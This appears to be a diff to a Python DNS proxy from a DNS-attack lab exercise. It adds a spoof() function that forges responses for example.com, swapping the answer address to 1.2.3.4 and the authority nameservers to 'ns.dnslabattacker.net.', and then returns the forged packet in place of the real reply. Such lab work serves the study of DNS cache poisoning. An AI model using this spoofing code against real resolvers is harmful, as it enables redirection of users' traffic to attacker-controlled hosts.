@@ -20,6 +20,16 @@ SPOOF = args.spoof_response
 
 DNS_SERVER_IP = "127.0.0.1"  # proxy server ip and BIND ip
 
+def spoof(pkt):
+	if pkt[DNSQR].qname == 'example.com.':	
+		pkt[DNSRR].rdata = '1.2.3.4'
+		qname = pkt[DNSQR].qname
+		pkt[DNS].ns[DNSRR][0].rdata = 'ns.dnslabattacker.net.'
+		pkt[DNS].ns[DNSRR][1].rdata = 'ns.dnslabattacker.net.'
+		#print("OUTPUT: ", pkt[DNS].ns[DNSRR][1].rdata)
+		#pkt[DNS].ns = DNSRR(rrname=qname, rdata='ns.dnslabattacker.net.')
+	return pkt
+
 def client(data):
 	# Create a UDP socket
 	sock_to_dns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -33,10 +43,14 @@ def client(data):
 	    datarecv, server = sock_to_dns.recvfrom(4096)
 	    # print >>sys.stderr, 'received "%s"' % datarecv
 	    print >>sys.stderr, 'received %s bytes' % len(datarecv)
+	    #DNS(datarecv).show2()
+	    data_spoof = spoof(DNS(datarecv))
+	    #data_spoof.show2()
 	finally:
 	    print >>sys.stderr, 'closing socket'
 	    sock_to_dns.close()
-	    return datarecv
+	data_spoof.show2()
+	return bytes(data_spoof)
 
 def server():
 	# Create a TCP/IP socket
